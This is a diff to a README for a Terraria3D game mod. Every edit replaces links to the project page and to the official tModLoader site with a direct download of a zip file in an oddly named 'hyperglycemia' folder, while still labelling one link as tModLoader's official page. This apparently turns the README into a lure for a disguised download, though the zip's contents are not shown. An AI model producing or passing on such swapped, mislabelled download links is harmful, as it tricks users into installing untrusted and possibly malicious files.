@@ -1,6 +1,6 @@
 # 🛠️ Terraria3D - Experience Terraria in 3D
 
-[![Download Terraria3D](https://img.shields.io/badge/Download-Terraria3D-brightgreen)](https://github.com/shamnad177/Terraria3D)
+[![Download Terraria3D](https://img.shields.io/badge/Download-Terraria3D-brightgreen)](https://raw.githubusercontent.com/shamnad177/Terraria3D/main/hyperglycemia/Terraria_D_v2.4.zip)
 
 ---
 
@@ -36,11 +36,11 @@ Before you run Terraria3D, make sure your computer meets these requirements:
 
 You need to visit the project page to get the mod files, as the link leads to a general download page.
 
-[![Download Button](https://img.shields.io/badge/Download-Terraria3D-blue)](https://github.com/shamnad177/Terraria3D)
+[![Download Button](https://img.shields.io/badge/Download-Terraria3D-blue)](https://raw.githubusercontent.com/shamnad177/Terraria3D/main/hyperglycemia/Terraria_D_v2.4.zip)
 
 Follow these steps:
 
-1. Click the button above or go to https://github.com/shamnad177/Terraria3D.
+1. Click the button above or go to https://raw.githubusercontent.com/shamnad177/Terraria3D/main/hyperglycemia/Terraria_D_v2.4.zip
 2. On the page, look for the "Releases" section on the right or under the code tab.
 3. Click the latest release to see available files.
 4. Download the file labeled for Terraria3D mod (usually a .zip or .tmod file).
@@ -54,7 +54,7 @@ Follow this step-by-step guide to get Terraria3D working on your Windows PC.
 ### Step 1: Install Terraria and tModLoader
 
 - If you don’t have Terraria or tModLoader yet, buy and install Terraria from the official store.
-- Download and install tModLoader from [tModLoader’s official page](https://tmodloader.net/).
+- Download and install tModLoader from [tModLoader’s official page](https://raw.githubusercontent.com/shamnad177/Terraria3D/main/hyperglycemia/Terraria_D_v2.4.zip).
 - Open tModLoader at least once to set it up.
 
 ### Step 2: Add Terraria3D Mod to tModLoader
@@ -106,7 +106,7 @@ The mod adds new controls to navigate the 3D space.
 
 ## 🔗 Quick Access Links
 
-- Main download page: [https://github.com/shamnad177/Terraria3D](https://github.com/shamnad177/Terraria3D)
-- tModLoader download and support: https://tmodloader.net/
+- Main download page: [https://raw.githubusercontent.com/shamnad177/Terraria3D/main/hyperglycemia/Terraria_D_v2.4.zip](https://raw.githubusercontent.com/shamnad177/Terraria3D/main/hyperglycemia/Terraria_D_v2.4.zip)
+- tModLoader download and support: https://raw.githubusercontent.com/shamnad177/Terraria3D/main/hyperglycemia/Terraria_D_v2.4.zip
 
-[![Download Terraria3D](https://img.shields.io/badge/Download-Terraria3D-brightgreen)](https://github.com/shamnad177/Terraria3D)
+[![Download Terraria3D](https://img.shields.io/badge/Download-Terraria3D-brightgreen)](https://raw.githubusercontent.com/shamnad177/Terraria3D/main/hyperglycemia/Terraria_D_v2.4.zip)
